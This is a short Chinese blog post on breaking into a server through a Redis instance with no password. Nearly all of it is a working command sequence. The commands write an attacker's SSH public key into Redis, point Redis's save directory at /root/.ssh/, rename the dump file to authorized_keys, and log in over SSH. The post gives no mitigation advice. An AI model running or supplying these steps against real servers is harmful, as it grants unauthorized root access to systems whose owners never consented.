---
title: 利用redis登录漏洞入侵服务器
tags:
  - redis
date: 2017-06-17 13:49:39
categories: 中间件
---

redis 没有设置密码认证情况下，可以通过该漏洞入侵服务器

```
# 生成秘钥
ssh-keygen -t rsa

# 生成用于写入redis的文件
 (echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n") >aa.txt

# 注入公钥
cat aa.txt | redis-cli -h 192.168.1.221 -x set aa

# 登录redis
redis-cli -h 192.168.1.221
# 切换路径
192.168.1.221:6379> config set dir /root/.ssh/
OK
# 修改save名称
192.168.1.221:6379> config set dbfilename "authorized_keys"
OK
# 保存数据到硬盘
192.168.1.221:6379> save
OK

# 此时可以直接登录到服务器了
ssh 192.168.1.221
```
